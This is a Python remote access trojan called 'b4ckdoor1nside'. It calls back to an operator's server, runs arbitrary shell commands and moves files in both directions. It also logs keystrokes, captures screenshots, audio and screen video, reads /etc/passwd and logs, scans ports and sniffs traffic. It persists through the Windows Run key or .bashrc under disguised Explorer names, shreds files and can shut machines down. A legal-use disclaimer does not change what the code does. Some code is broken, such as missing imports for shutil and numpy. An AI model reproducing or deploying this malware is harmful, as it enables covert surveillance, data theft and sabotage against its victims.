#!/usr/bin/env python3

import socket
import subprocess
import os
import base64
import time
import json
import sys
import platform
import re
import uuid
import psutil
import pyshark
import nmap
import pyaudio
import wave
import cv2
from mss import mss
from pynput.keyboard import Key, Listener
from threading import Thread, Lock
from cryptography.fernet import Fernet
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Configuration
BUFFER_SIZE = 4096
ENCRYPTION_KEY = Fernet.generate_key()
fernet = Fernet(ENCRYPTION_KEY)
command_set = set()
command_lock = Lock()

# Keylogger global variable
log = ""

ascii_art = """

 _     _  _        _       _                  _           _     _      
| |__ | || |   ___| | ____| | ___   ___  _ __/ |_ __  ___(_) __| | ___ 
| '_ \| || |_ / __| |/ / _` |/ _ \ / _ \| '__| | '_ \/ __| |/ _` |/ _ \
| |_) |__   _| (__|   < (_| | (_) | (_) | |  | | | | \__ \ | (_| |  __/
|_.__/   |_|  \___|_|\_\__,_|\___/ \___/|_|  |_|_| |_|___/_|\__,_|\___|
                                                                       

"""

legal_warning = """
********************************************************************************
* This tool is intended for ethical and legal purposes only. Usage of this     *
* tool for unauthorized access to systems and networks is prohibited and       *
* punishable by law. The developers and distributors of this tool are not      *
* responsible for any illegal activities carried out using this tool. Please   *
* ensure you have proper authorization before using this tool.                 *
********************************************************************************
"""

def reliable_send(data):
    encrypted_data = fernet.encrypt(json.dumps(data).encode())
    s.send(encrypted_data)

def reliable_recv():
    encrypted_data = s.recv(BUFFER_SIZE)
    return json.loads(fernet.decrypt(encrypted_data).decode())

def execute_system_command(command):
    return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode()

def change_working_directory_to(path):
    os.chdir(path)
    return "[+] Changing working directory to " + path

def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read()).decode()

def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
        return "[+] Upload successful"

def take_screenshot():
    with mss() as screenshot:
        screenshot.shot(output='screenshot.png')
    with open('screenshot.png', 'rb') as file:
        screenshot_data = base64.b64encode(file.read()).decode()
    os.remove('screenshot.png')
    return screenshot_data

def start_keylogger():
    global log
    log = ""
    def on_press(key):
        nonlocal log
        try:
            log += key.char
        except AttributeError:
            if key == Key.space:
                log += " "
            else:
                log += f" [{key}] "
    
    def on_release(key):
        if key == Key.esc:
            return False
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def get_network_info():
    return subprocess.check_output("ifconfig", shell=True).decode()

def maintain_persistence():
    if platform.system() == "Windows":
        location = os.getenv("appdata") + "\\Windows Explorer.exe"
        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d "{location}"', shell=True)
    else:
        location = "/usr/local/bin/explorer"
        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            with open(os.path.expanduser("~/.bashrc"), "a") as file:
                file.write(f"\n{location}\n")

def start_listener(server_port):
    listener_command = f"nc -lvp {server_port}"
    subprocess.Popen(listener_command, shell=True)

def collect_system_info():
    system_info = {}
    system_info["platform"] = platform.system()
    system_info["platform-release"] = platform.release()
    system_info["platform-version"] = platform.version()
    system_info["architecture"] = platform.machine()
    system_info["hostname"] = socket.gethostname()
    system_info["ip-address"] = socket.gethostbyname(socket.gethostname())
    system_info["mac-address"] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    system_info["processor"] = platform.processor()
    system_info["ram"] = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
    return system_info

def list_processes():
    process_list = []
    for proc in psutil.process_iter(['pid', 'name']):
        process_list.append(proc.info)
    return process_list

def kill_process(pid):
    try:
        p = psutil.Process(pid)
        p.terminate()
        return f"[+] Process {pid} terminated"
    except Exception as e:
        return str(e)

def port_scan(target_ip, port_range):
    nm = nmap.PortScanner()
    nm.scan(target_ip, port_range)
    scan_result = {}
    for host in nm.all_hosts():
        scan_result[host] = nm[host]
    return scan_result

def monitor_network_traffic(interface):
    capture = pyshark.LiveCapture(interface=interface)
    packets = []
    for packet in capture.sniff_continuously(packet_count=10):
        packets.append(packet)
    return packets

def manage_users(command):
    if platform.system() == "Windows":
        if command == "list_users":
            return subprocess.check_output("net user", shell=True).decode()
        else:
            return subprocess.check_output(command, shell=True).decode()
    else:
        if command == "list_users":
            return subprocess.check_output("cat /etc/passwd", shell=True).decode()
        else:
            return subprocess.check_output(command, shell=True).decode()

def schedule_task(command):
    if platform.system() == "Windows":
        return subprocess.check_output(f"schtasks {command}", shell=True).decode()
    else:
        return subprocess.check_output(f"cron {command}", shell=True).decode()

def read_logs():
    if platform.system() == "Windows":
        return subprocess.check_output("wevtutil qe System /f:text", shell=True).decode()
    else:
        return subprocess.check_output("cat /var/log/syslog", shell=True).decode()

def edit_registry(command):
    if platform.system() == "Windows":
        return subprocess.check_output(f"reg {command}", shell=True).decode()

def search_files(directory, file_name):
    matches = []
    for root, dirnames, filenames in os.walk(directory):
        for filename in filenames:
            if file_name in filename:
                matches.append(os.path.join(root, filename))
    return matches

def shutdown_system():
    if platform.system() == "Windows":
        return subprocess.check_output("shutdown /s /t 1", shell=True).decode()
    else:
        return subprocess.check_output("shutdown -h now", shell=True).decode()

def reboot_system():
    if platform.system() == "Windows":
        return subprocess.check_output("shutdown /r /t 1", shell=True).decode()
    else:
        return subprocess.check_output("reboot", shell=True).decode()

def record_audio(duration):
    audio = pyaudio.PyAudio()
    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
    frames = []
    for _ in range(0, int(44100 / 1024 * duration)):
        data = stream.read(1024)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    audio.terminate()
    wave_file = wave.open("recorded_audio.wav", "wb")
    wave_file.setnchannels(1)
    wave_file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
    wave_file.setframerate(44100)
    wave_file.writeframes(b''.join(frames))
    wave_file.close()
    with open("recorded_audio.wav", "rb") as file:
        audio_data = base64.b64encode(file.read()).decode()
    os.remove("recorded_audio.wav")
    return audio_data

def record_screen(duration):
    screen_capture = cv2.VideoWriter("screen_recording.avi", cv2.VideoWriter_fourcc(*"XVID"), 8, (1920, 1080))
    start_time = time.time()
    while int(time.time() - start_time) < duration:
        with mss() as sct:
            img = sct.grab(sct.monitors[0])
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
            screen_capture.write(frame)
    screen_capture.release()
    with open("screen_recording.avi", "rb") as file:
        video_data = base64.b64encode(file.read()).decode()
    os.remove("screen_recording.avi")
    return video_data

def list_network_connections():
    if platform.system() == "Windows":
        return subprocess.check_output("netstat -an", shell=True).decode()
    else:
        return subprocess.check_output("netstat -tulnp", shell=True).decode()

def log_output(command_result):
    with open("command_output.log", "a") as log_file:
        log_file.write(command_result + "\n")

def shred_file(path, passes=3):
    with open(path, "ba+", buffering=0) as f:
        length = f.tell()
    with open(path, "br+", buffering=0) as f:
        for _ in range(passes):
            f.seek(0)
            f.write(os.urandom(length))
    os.remove(path)
    return "[+] File shredded successfully"

def send_email(subject, body):
    sender_email = "your_email@example.com"
    receiver_email = "receiver_email@example.com"
    password = "your_email_password"
    
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, password)
    text = msg.as_string()
    server.sendmail(sender_email, receiver_email, text)
    server.quit()

def dynamic_command_update(new_commands):
    with command_lock:
        command_set.update(new_commands)

def monitor_directory(directory):
    before = dict([(f, None) for f in os.listdir(directory)])
    while True:
        time.sleep(10)
        after = dict([(f, None) for f in os.listdir(directory)])
        added = [f for f in after if not f in before]
        removed = [f for f in before if not f in after]
        if added: 
            send_email("File Added", f"File(s) added: {', '.join(added)}")
        if removed: 
            send_email("File Removed", f"File(s) removed: {', '.join(removed)}")
        before = after

def start_monitoring_thread(directory):
    monitor_thread = Thread(target=monitor_directory, args=(directory,))
    monitor_thread.start()

def connect(server_ip, server_port):
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, server_port))
    
    while True:
        try:
            command = reliable_recv()
            
            if command.lower() == "exit":
                break
            elif command.startswith("cd "):
                command_result = change_working_directory_to(command[3:])
            elif command.startswith("download "):
                command_result = read_file(command[9:])
            elif command.startswith("upload "):
                file_name = command[7:]
                file_content = reliable_recv()
                command_result = write_file(file_name, file_content)
            elif command == "screenshot":
                command_result = take_screenshot()
            elif command == "keylogger_start":
                keylogger_thread = Thread(target=start_keylogger)
                keylogger_thread.start()
                command_result = "[+] Keylogger started"
            elif command == "keylogger_dump":
                command_result = log
            elif command == "network_info":
                command_result = get_network_info()
            elif command == "persistence":
                maintain_persistence()
                command_result = "[+] Persistence established"
            elif command == "system_info":
                command_result = collect_system_info()
            elif command == "list_processes":
                command_result = list_processes()
            elif command.startswith("kill_process "):
                pid = int(command.split(" ")[1])
                command_result = kill_process(pid)
            elif command.startswith("port_scan "):
                target_ip, port_range = command.split(" ")[1], command.split(" ")[2]
                command_result = port_scan(target_ip, port_range)
            elif command.startswith("network_traffic "):
                interface = command.split(" ")[1]
                command_result = monitor_network_traffic(interface)
            elif command.startswith("manage_users "):
                manage_command = ' '.join(command.split(" ")[1:])
                command_result = manage_users(manage_command)
            elif command.startswith("schedule_task "):
                schedule_command = ' '.join(command.split(" ")[1:])
                command_result = schedule_task(schedule_command)
            elif command == "read_logs":
                command_result = read_logs()
            elif command.startswith("edit_registry "):
                registry_command = ' '.join(command.split(" ")[1:])
                command_result = edit_registry(registry_command)
            elif command.startswith("search_files "):
                directory, file_name = command.split(" ")[1], command.split(" ")[2]
                command_result = search_files(directory, file_name)
            elif command == "shutdown":
                command_result = shutdown_system()
            elif command == "reboot":
                command_result = reboot_system()
            elif command.startswith("record_audio "):
                duration = int(command.split(" ")[1])
                command_result = record_audio(duration)
            elif command.startswith("record_screen "):
                duration = int(command.split(" ")[1])
                command_result = record_screen(duration)
            elif command == "list_network_connections":
                command_result = list_network_connections()
            elif command.startswith("dynamic_command_update "):
                new_commands = command.split(" ")[1:]
                command_result = dynamic_command_update(new_commands)
            elif command.startswith("start_monitoring "):
                directory = command.split(" ")[1]
                start_monitoring_thread(directory)
                command_result = "[+] Monitoring started"
            elif command.startswith("shred_file "):
                file_path = command.split(" ")[1]
                command_result = shred_file(file_path)
            else:
                command_result = execute_system_command(command)
            
            log_output(command_result)
            reliable_send(command_result)
        except Exception as e:
            reliable_send(str(e))
    
    s.close()

def main():
    print(ascii_art)
    print(legal_warning)
    print("Welcome to b4ckdoor1nside")
    server_ip = input("Enter the server IP address: ")
    server_port = int(input("Enter the server port: "))
    start_listener(server_port)
    time.sleep(2)  # wait for the listener to start
    connect(server_ip, server_port)

if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception as e:
            time.sleep(5)
            continue
